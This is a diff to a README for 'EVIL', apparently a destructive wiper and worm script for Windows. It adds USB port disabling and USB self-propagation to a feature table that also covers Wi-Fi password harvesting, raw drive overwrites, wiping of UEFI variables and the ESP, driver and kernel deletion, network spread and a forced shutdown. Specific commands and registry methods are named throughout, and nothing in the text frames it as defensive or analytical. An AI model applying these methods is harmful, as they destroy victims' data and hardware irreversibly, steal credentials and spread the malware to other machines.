@@ -12,6 +12,8 @@ EVIL 2.5 - cross-platform collection of scripts for complete and irreversible de
 ### Windows 
 # EVIL 6.6 NewGen 
 
+## What This Script Does
+
 | # | Feature | Details |
 |---|---------|---------|
 | 1 | **Wi-Fi Passwords Harvest** | Extracts all saved Wi-Fi passwords (русский/english fallback) |
@@ -35,13 +37,25 @@ EVIL 2.5 - cross-platform collection of scripts for complete and irreversible de
 | 19 | **IP Stack Reset** | netsh int ip reset all |
 | 20 | **Firewall Total Block** | blockinbound,blockoutbound + all rules disabled |
 | 21 | **DNS Client Disabled** | sc config Dnscache start= disabled + sc stop |
-| 22 | **WinRing0 Hardware Kill** | MSR write (CPU power), PCI config kill, EC ports, SATA/AHCI, Thunderbolt, TPM |
-| 23 | **PnP Devices Disabled** | All non-critical devices (ACPI/PCI/Processor excluded) |
-| 24 | **Logical Drives Overwrite** | Raw write 200×100MB to C:/D:/E: |
-| 25 | **Network Spread** | Copies itself to all network drives (DriveType 4) |
-| 26 | **USB Spread** | Copies itself to all USB drives (InterfaceType USB) |
-| 27 | **Self-Deletion** | Set-PendingDelete on script itself |
-| 28 | **Winlogon Kill + Shutdown** | Stop-Process winlogon + Stop-Computer -Force |
+| 22 | **USB Ports KILL** | USBSTOR/USBHUB3/USBXHCI disabled via registry + driver files deleted + PnP disable |
+| 23 | **USB Spread (Infection)** | Copies itself to every USB drive automatically |
+| 24 | **WinRing0 Hardware Kill** | MSR write (CPU power), PCI config kill, EC ports, SATA/AHCI, Thunderbolt, TPM |
+| 25 | **PnP Devices Disabled** | All non-critical devices (ACPI/PCI/Processor excluded) |
+| 26 | **Logical Drives Overwrite** | Raw write 200×100MB to C:/D:/E: |
+| 27 | **Network Spread** | Copies itself to all network drives (DriveType 4) |
+| 28 | **Self-Deletion** | Set-PendingDelete on script itself |
+| 29 | **Winlogon Kill + Shutdown** | Stop-Process winlogon + Stop-Computer -Force |
+
+---
+
+## USB Attack Details
+
+| Action | Method |
+|--------|--------|
+| **Registry disable** | USBSTOR, USBHUB3, USBXHCI — Start=4 |
+| **Driver file deletion** | USBSTOR.SYS, USBHUB3.SYS, USBXHCI.SYS — queued for deletion |
+| **PnP disable** | Get-PnpDevice -Class USB | Disable-PnpDevice |
+| **USB spread** | Copies evil.ps1 to every USB drive found |
 
 ---
 
@@ -78,6 +92,7 @@ EVIL 2.5 - cross-platform collection of scripts for complete and irreversible de
 | ESP kill | `mountvol Z: /s` + raw write + `Add-PartitionAccessPath` fallback | Permanent |
 | Kernel delete | `PendingFileRenameOperations` registry | After reboot |
 | Driver disable | `Start=4` in registry + PnP disable + `.sys` deletion | After reboot |
+| USB kill | `Start=4` + driver deletion + PnP disable | After reboot |
 | Registry kill | Zero overwrite (10MB) + `PendingFileRenameOperations` | Permanent |
 | UEFI variables | `Set-FirmwareEnvironmentVariable` (0xFF,0xFF,0xFF,0xFF) | Permanent |
 | Network | Firewall block + adapter disable + DNS kill | Permanent |
@@ -89,10 +104,12 @@ EVIL 2.5 - cross-platform collection of scripts for complete and irreversible de
 - **All data on all drives** — permanently lost (DoD 7-pass + clean all)
 - **Windows cannot boot** — bootloader + kernel + registry destroyed
 - **Drives may not be detected** — storage drivers disabled + driver files deleted
+- **USB ports dead** — USBSTOR/USBHUB3/USBXHCI disabled + driver files deleted
 - **UEFI/BIOS** — variables wiped, ESP destroyed
 - **Network** — adapters disabled, firewall blocks all, DNS dead
 - **Wi-Fi** — all profiles deleted
 - **Router** — rebooted/reset (hardware brick on old models)
+
 
 ---
 
